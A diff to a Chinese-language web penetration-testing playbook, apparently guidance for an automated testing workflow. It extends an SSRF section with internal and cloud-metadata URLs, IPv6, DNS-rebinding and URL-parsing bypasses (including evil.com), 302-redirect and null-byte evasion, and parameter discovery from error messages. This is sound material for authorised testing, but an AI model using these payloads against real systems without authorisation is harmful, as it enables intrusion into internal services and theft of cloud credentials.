@@ -1293,12 +1293,25 @@ Phase 2 的 JS 分析已经提取了每个 API 端点的调用现场参数结构
    redirect/next/url → 开放重定向
    data/html/content → XSS/富文本注入
 
-3. SSRF专项测试（参数含 url/path/redirect/domain/host/target）:
-   - 替换为内网地址: http://127.0.0.1:8080, http://10.0.0.1, http://172.16.0.1
+3. SSRF专项测试（参数含 url/path/redirect/domain/host/target 的端点必须逐个测试 SSRF）:
+   - 基础测试: 替换为内网地址 http://127.0.0.1:8080, http://10.0.0.1, http://172.16.0.1
    - 云元数据: http://169.254.169.254/latest/meta-data/（AWS/阿里云）
    - 华为云元数据: http://169.254.169.254/openstack/latest/
    - 内部服务探测: http://localhost:6379(Redis), http://localhost:3306(MySQL)
    - 观察响应差异: 超时vs拒绝vs返回数据 = 内网服务存活
+   - **IPv6绕过黑名单**: http://[::1]:8080, http://[0:0:0:0:0:ffff:127.0.0.1]:8080, http://[::ffff:127.0.0.1]
+   - **DNS重绑定绕过**: http://127.0.0.1.nip.io:8080, http://10.0.0.1.xip.io
+   - **URL解析差异**: http://127.0.0.1:8080@evil.com, http://evil.com/../127.0.0.1:8080/
+   - **短链接302跳绕过**: 搭一个外部域名做302跳转到内网地址
+   - 如果上述测试都返回403/拦截，尝试在参数前加空格/换行/%00截断:
+     url= http://127.0.0.1:8080, url=%00http://127.0.0.1:8080
+
+   **响应体反向推断参数**（对POST端点不知道参数结构时）:
+   - 发空POST {} 看错误提示是否包含期望字段名
+   - 返回 {"error":"参数url不能为空"} → 有 url 参数，SSRF机会
+   - 返回 {"error":"缺少参数 imageUrl"} → imageUrl 参数
+   - 返回 {"msg":"file not found"} → 有 file/path 参数
+   - 这种反向推断也是有效的参数发现手段
 
 4. 组件版本识别 + CVE比对:
    - 识别组件指纹（从响应头Server/X-Powered-By/body中的版本号）
